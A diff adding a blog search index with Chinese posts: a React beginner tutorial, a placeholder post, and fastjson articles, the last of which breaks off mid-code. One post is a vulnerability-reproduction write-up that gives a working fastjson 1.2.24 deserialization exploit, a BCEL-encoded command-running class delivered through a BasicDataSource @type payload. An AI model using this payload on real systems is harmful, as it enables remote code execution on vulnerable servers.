@@ -1,0 +1,405 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>React教程1</title>
+    <url>/prog/2023/06/710649c76ada/</url>
+    <content><![CDATA[<h2 id="React框架介绍"><a href="#React框架介绍" class="headerlink" title="React框架介绍"></a>React框架介绍</h2><h3 id="React是什么？"><a href="#React是什么？" class="headerlink" title="React是什么？"></a>React是什么？</h3><p>​	React是一款由Facebook团队在2013年5月开源的前端JavaScript组件库。它是为了解决正常前端开发时将处理服务器端或用户端的动态数据反映到复杂的用户界面上而推出的一款组件库。</p>
+<h3 id="React与传统MVC的关系"><a href="#React与传统MVC的关系" class="headerlink" title="React与传统MVC的关系"></a>React与传统MVC的关系</h3><p>​	React在MVC设计模式中，算是一款非常轻量级的View(视图)层级的组件库。但是React并不非常认可MVC开发模式。因为React是将界面分成了各个独立的组件(零件)，将这些组件进行组合、嵌套，就组成了前端的页面。</p>
+<h3 id="React为什么高性能？"><a href="#React为什么高性能？" class="headerlink" title="React为什么高性能？"></a>React为什么高性能？</h3><p>​	React为了解决开发时过多操作DOM元素形成的性能损耗问题，提供了虚拟DOM(virtual DOM)的机制。简单来说，就是在浏览器端使用JavaScript实现了一套DOM API。所以在使用React进行开发时，代码中所有的DOM构造都是通过虚拟DOM进行的，每当数据变化时，React会重新渲染整个DOM树，然后React将当前整个DOM树和上一次的DOM树进行对比，得到DOM构造的区别，然后将仅仅需要变化的部分进行实际的浏览器DOM更新操作。而且React能够批量处理虚拟DOM的刷新，在一个事件循环（Event loop）内的两次数据变化被合并，例如你连续的先将节点内容从A-B,B-A，React会认为A变成B，然后又从B变成A UI不发生任何变化，而如果通过手动控制，这种逻辑通常是极其复杂的。</p>
+<h3 id="为什么使用React？"><a href="#为什么使用React？" class="headerlink" title="为什么使用React？"></a>为什么使用React？</h3><h4 id="1-React的虚拟DOM"><a href="#1-React的虚拟DOM" class="headerlink" title="1. React的虚拟DOM"></a>1. React的虚拟DOM</h4><p>​	机制是通过变量形式的dom模型来操作DOM的，一切操作和换算直接在变量中，这样减少了操作真实dom，性能真实相当的高，和主流MVC框架没有什么本质区别，并不和dom打交道。</p>
+<h4 id="2-组件系统"><a href="#2-组件系统" class="headerlink" title="2. 组件系统"></a>2. 组件系统</h4><p>​	React最核心的思想就是将页面中任何一个区域获取元素都可以看作一个组件component来进行组合。</p>
+<blockquote>
+<p>组件：React的组件指的是同时包含了HTML、CSS、JavaScript、image等元素的聚合体</p>
+</blockquote>
+<h4 id="3-单向数据流"><a href="#3-单向数据流" class="headerlink" title="3. 单向数据流"></a>3. 单向数据流</h4><p>​	其实reactjs的核心内容就是数据绑定，所谓数据绑定指的是只要将一些服务端的数据和前端页面绑定好，开发者只关注实现业务就行了。</p>
+<h4 id="4-JSX语法"><a href="#4-JSX语法" class="headerlink" title="4. JSX语法"></a>4. JSX语法</h4><p>​	在另一个非常热门的前端框架Vue中，是使用render函数来构建组件的dom构造的，它省去了查找和编译模板的过程，但是在render中利用createElement创建结构的时候代码可读性较低，较为负载。React中提供了JSX语法来在render中创建dom，使性能更高，直接解决了这个问题，但是前提是需要使用工具编译jsx。</p>
+<h3 id="React应该用在哪？"><a href="#React应该用在哪？" class="headerlink" title="React应该用在哪？"></a>React应该用在哪？</h3><p>​	相对于另一款热门的前端框架Vue，React更适合开发更大型、交互更多的网站。例如：虎牙直播、MDN、爱彼迎等等非常大型的网站都是由React开发的。因为Vue在处理页面状态的性能上不足以能和React比肩。并且React的开发模式更偏向于那些主流的高级后端语言，对于有一定基础的开发者来说，学习React上手会更快。</p>
+<blockquote>
+<p>注意：可以根据个人喜好来选择前端开发所使用的框架，这里只是按照各个框架和组件库的性能来客观选择的。</p>
+</blockquote>
+<h2 id="React如何开始"><a href="#React如何开始" class="headerlink" title="React如何开始"></a>React如何开始</h2><p>首先下node.js，下载链接如下：</p>
+<p>windows: <a href="https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1-x64.msi">https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1-x64.msi</a></p>
+<p>linux: <a href="https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1.tar.gz">https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1.tar.gz</a></p>
+<p>mac: <a href="https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1.pkg">https://npmmirror.com/mirrors/node/v18.16.1/node-v18.16.1.pkg</a></p>
+<blockquote>
+<p>这里使用windows+vscode+案例来做演示</p>
+</blockquote>
+<p>安装完成之后，在命令行中输入<code>node -v</code> 来测试是否安装成功；如果显示结果如下，即安装成功：</p>
+<p><img src="image-20230702153628328.png" alt="image-20230702153628328"></p>
+<p>在vscode中打开命令行输入：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g create-react-app</span><br><span class="line">create-react-app 项目名</span><br></pre></td></tr></table></figure>
+
+<p>搭建完成之后项目目录如下：</p>
+<p><img src="image-20230702154147758.png" alt="image-20230702154147758"></p>
+<p>然后在当前目录的命令行中输入：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 项目名</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230702154308738.png" alt="image-20230702154308738"></p>
+<p>如果命令行出现如下信息，并且浏览器自动弹出窗口打开页面，就表示项目搭建成功了</p>
+<p><img src="image-20230702154440098.png" alt="image-20230702154440098"></p>
+<p>页面内容如下：</p>
+<p><img src="image-20230702154529549.png" alt="image-20230702154529549"></p>
+<blockquote>
+<p>打马赛克的都是后期自己加上去的，刚开始运行的界面就是去掉马赛克内容后的界面</p>
+</blockquote>
+<h2 id="大显身手的第一次"><a href="#大显身手的第一次" class="headerlink" title="大显身手的第一次"></a>大显身手的第一次</h2><p>一开始看不懂没关系，先看看源代码一开始是如何渲染运作的：</p>
+<div class="tabs" id="app.js"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#app.js-1">App.js</button></li><li class="tab"><button type="button" data-href="#app.js-2">index.js</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="app.js-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logo <span class="keyword">from</span> <span class="string">&quot;./logo.svg&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./App.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">className</span>=<span class="string">&quot;App-header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;logo&#125;</span> <span class="attr">className</span>=<span class="string">&quot;App-logo&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          Edit <span class="tag">&lt;<span class="name">code</span>&gt;</span>src/App.js<span class="tag">&lt;/<span class="name">code</span>&gt;</span> and save to reload.</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">a</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">className</span>=<span class="string">&quot;App-link&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">href</span>=<span class="string">&quot;https://reactjs.org&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          Learn React</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面是App.js中的源代码，在上面可以看出，它是用ES6的语法进行开发的，其中：需要渲染的代码都存放在了App这个function中，然后通过export 导出这个function；那么在App这个function中，可以看到它只有一个<code>return()</code>，而return的括号中写了一些html的标签，而这些标签显然就是渲染出去的代码。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="app.js-2"><p>接下来跳转到index.js中：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom/client&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./index.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> reportWebVitals <span class="keyword">from</span> <span class="string">&#x27;./reportWebVitals&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// If you want to start measuring performance in your app, pass a function</span></span><br><span class="line"><span class="comment">// to log results (for example: reportWebVitals(console.log))</span></span><br><span class="line"><span class="comment">// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals</span></span><br><span class="line"><span class="title function_">reportWebVitals</span>();</span><br></pre></td></tr></table></figure>
+
+<p>在index.js中可以看到，它是通过使用ReactDOM对象中的的render方法来将页面渲染到浏览器上的。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<p>​	通过查看这两个文件可以知道，可以推测出：index.js就是用来渲染的文件，而App.js的文件就是用来返回渲染的内容的。</p>
+<hr>
+
+<p>​	为了验证上面的推测，可以在App.js做一些修改，来验证是否是上面所说的。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logo <span class="keyword">from</span> <span class="string">&quot;./logo.svg&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./App.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">className</span>=<span class="string">&quot;App-header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;logo&#125;</span> <span class="attr">className</span>=<span class="string">&quot;App-logo&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天开始学习React辣！学习时间：&#123;new Date().toLocaleDateString()&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          Edit <span class="tag">&lt;<span class="name">code</span>&gt;</span>src/App.js<span class="tag">&lt;/<span class="name">code</span>&gt;</span> and save to reload.</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">a</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">className</span>=<span class="string">&quot;App-link&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">href</span>=<span class="string">&quot;https://reactjs.org&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          Learn React</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中，我们在<code>img</code>标签下添加了一个<code>h2</code>标签，接下来运行项目看看页面是否发生了变化。</p>
+<blockquote>
+<p>注意：可以一直运行着项目，每当更新代码时，react都会自动渲染更新的代码。所以，只用跑一次项目就可以了。</p>
+</blockquote>
+<p><img src="image-20230702163028410.png" alt="image-20230702163028410"></p>
+<p>可以看到，添加的代码成功渲染到页面上了。刚好也验证了上面的推测。</p>
+<blockquote>
+<p>后面的内容，请到这个系列的下一篇文章查看。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>prog</category>
+      </categories>
+      <tags>
+        <tag>react</tag>
+        <tag>前端</tag>
+        <tag>开发</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>React笔记2</title>
+    <url>/prog/2023/07/69b90674ea8b/</url>
+    <content><![CDATA[<h1 id="目前还在编写中-…"><a href="#目前还在编写中-…" class="headerlink" title="目前还在编写中 …."></a>目前还在编写中 ….</h1>]]></content>
+      <categories>
+        <category>prog</category>
+      </categories>
+      <tags>
+        <tag>react</tag>
+        <tag>前端</tag>
+        <tag>开发</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson漏洞不出网利用</title>
+    <url>/stcs/2023/07/5dfcbb92c2c0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在进入主题前，先分析一下fastjson公开的三条利用链：</p>
+<ol>
+<li><p>JNDI(JdbcRowSetImpl)</p>
+<ul>
+<li>攻击类：<code>com.sun.rowset.JdbcRowSetImpl</code></li>
+<li>优点：实战可以利用，JDNI注入基于较低版本的JDK，LDAP适用范围更广</li>
+<li>缺点：必须出网加载远程的恶意字节码，有一定的局限性</li>
+</ul>
+</li>
+<li><p>TemplateImpl</p>
+<ul>
+<li>攻击类：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
+<li>优点：TemplatesImpl类是Java反序列化界比较常用的类，更容易理解和上手</li>
+<li>缺点：需要开启<code>Feature.SupportNonPublicField</code>，实战中不适用</li>
+</ul>
+</li>
+<li><p>BasicDataSource</p>
+<ul>
+<li><p>攻击类：</p>
+<ul>
+<li><p>tomcat8或以上：<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+</li>
+<li><p>tomcat8以下：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code></p>
+</li>
+</ul>
+</li>
+<li><p>优点：不需要出网，不需要开启特殊的参数，适用范围较广</p>
+</li>
+<li><p>缺点：需要有tomcat的依赖</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="什么是BCEL"><a href="#什么是BCEL" class="headerlink" title="什么是BCEL"></a>什么是BCEL</h1><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API.</p>
+<p>这里不做过多解释，具体介绍请参考文章：<a href="https://blog.csdn.net/evasnowind/article/details/100727903">https://blog.csdn.net/evasnowind/article/details/100727903</a></p>
+<h1 id="BCEL使用"><a href="#BCEL使用" class="headerlink" title="BCEL使用"></a>BCEL使用</h1><p>BCEL这个包中有个ClassLoder的类，它重写了Java内置的<code>ClassLoader#loadClass()</code>方法。 在<code>ClassLoader#loadClass()</code>中，会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行解码。可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。默认情况下外层还会加一层GZip压缩。</p>
+<p>我们可以构造以下的代码来初步使用和体验BCEL：</p>
+<div class="tabs" id="eval.java"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#eval.java-1">Eval.java</button></li><li class="tab"><button type="button" data-href="#eval.java-2">Main.java</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="eval.java-1"><p>编写一个执行命令的类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Eval</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="eval.java-2"><p>这里使用BCEL提供的<code>Repository</code>类将一个JavaClass先转换成字节码(编译)，再使用<code>Utility</code>类将原生的字节码转换成BCEL字节码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Eval.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodeStr</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encodeStr);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span> + encodeStr, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<p>运行后，会正常执行Eval类的代码。</p>
+<p><img src="image-20230719201958847.png" alt="image-20230719201958847"></p>
+<h1 id="fastjson漏洞利用"><a href="#fastjson漏洞利用" class="headerlink" title="fastjson漏洞利用"></a>fastjson漏洞利用</h1><p>看到这里可能会有疑问：上面说了这么多BCEL，那和BasicDataSource有什么关系呢？其实是有的，在分析代码之前，先在代码中导入tomcat的依赖，因为BasicDataSource是依赖于tomcat的。先导入maven的依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.36<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;payload\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$C1$U$3d$85$91a$c6Ae$f0$fdf$r$b8$90$8d$3b$8c$h$83$h$c7G$c4$e8$ba$d4$G$ab$c3$8c$Z$K$e1$8f$5c$b3Q$e3$c2$P$f0$a3$8c$b7$95$a8$89Mzo$eey$dd$a6$l$9fo$ef$A$f6Q$f5$e1b$de$c7$C$W$8bX2$7d$d9$c5$8a$8bU$Xk$M$85$D$95$u$7d$c8$90$af$d5$af$Z$9c$a3$f4V2$ccF$w$91g$83$5eGfW$bc$T$T$SF$a9$e0$f15$cf$94$99$t$a0$a3$efT$9f2$a2$d6$90$c7M$86$e2$81$88$tq$a5$b6$e6$e2$e1$94$3fZ$v$zd$f0$db$e9$m$T$f2X$Z$abg$y$7b$f7$7c$c8$D$U$e1$b9X$P$b0$81M$ca$a45$o$c0$W$b6$Z$w$86o$c4$3c$e96Z$p$n$l$b5J$TR$Y$x$c3$dc$_y$de$b9$97B3$94$7f$a1$cbA$a2U$8f$W$f9$5d$a9$7f$86$85Z$3d$fa$a7$a1$87$3br$q$F$c3N$ed$P$db$d6$99J$ba$cd$bf$86$8b$y$V$b2$dfo$a2$8a$C$7d$aa990$f3$7e$aa$3eM$N$ea$8c$fa$d4$ee$L$d8$d8$d2$d3T$L$W$cc$n$a0$g$7c$LP$c2$M$f5$of$7f$cc$e76$M$98yE$$$cc$3f$c3$b9y$82s2$b6$98G$be$v$e4mZ$I$c7$sx$e4$O$u$bbdY$93$P$cc$d1u$91$8b$5c$94A$c6$d0$c2$95$_$5c$bcr$b3$M$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;key\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中的<code>driverClassName</code>字段，就是使用BCEL转换后的字节码</p>
+<p>执行结果如下图：</p>
+<p><img src="image-20230719204420503.png" alt="image-20230719204420503"></p>
+<p>因作者代码审计能力过于薄弱，具体的代码分析可以参考文章：<a href="https://www.anquanke.com/post/id/248892#h2-1">https://www.anquanke.com/post/id/248892#h2-1</a></p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>文章参考：</p>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/248892#h2-1">https://www.anquanke.com/post/id/248892#h2-1</a></p>
+<p><a href="https://www.cnblogs.com/R0ser1/p/15918626.html">https://www.cnblogs.com/R0ser1/p/15918626.html</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>stcs</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>红队</tag>
+        <tag>fastjson</tag>
+        <tag>Java漏洞</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson反序列化漏洞</title>
+    <url>/stcs/2023/07/e08e901851f2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><mark class="hl-label blue">fastjson</mark> 是一个由阿里开发的开源Java类库，可以将Java对象转换为JSON格式；当然，它也可以将JSON字符串转换为Java对象。fastjson可以操作任何Java对象，即使是一些预先存在的没有源码的对象，fastjson也可以进行操作。所以它的使用是很广泛的。
+
+<h2 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h2><p>序列化就是将一个对象转换成JSON字符串的过程，而反序列化就是将JSON字符串转换成对象的过程。</p>
+<h1 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a>AutoType</h1><p>在进行漏洞复现之前，先来了解一下fastjson的<mark class="hl-label blue">AutoType</mark> 的机制</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>fastjson引入了<mark class="hl-label blue">@AutoType</mark> 的注解，fastjson在读取json字符串并进行反序列化操作时，会读取到json字符串中的<mark class="hl-label blue">@type</mark> 的内容，将json字符串的内容反序列化为Java对象并调用这个对象所属类的setter方法。</p>
+<blockquote>
+<p>当然，漏洞产生的原因也是因为这个AutoType的功能。</p>
+</blockquote>
+<h2 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h2><p>既然上文都说了漏洞产生的原因也是在这个AutoType的功能上产生的，那为什么还要使用呢？</p>
+<p>其实fastjson在进行转换的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。对于JSON框架来说，想要把一个Java对象转换成字符串。可以使用下面两种方法进行转换：</p>
+<ol>
+<li>基于<code>getter</code>和<code>setter</code></li>
+<li>AutoType</li>
+</ol>
+<h3 id="基于getter和setter"><a href="#基于getter和setter" class="headerlink" title="基于getter和setter"></a>基于<code>getter</code>和<code>setter</code></h3><p>基于<code>getter</code>和<code>setter</code>来进行序列化和反序列化操作时，当转换后得到对象的类只有一个接口的时候，将这个类的对象进行反序列化操作的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。示例代码如下：</p>
+<div class="tabs" id="store.java"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#store.java-1">store.java</button></li><li class="tab"><button type="button" data-href="#store.java-2">main.java</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="store.java-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Store</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span 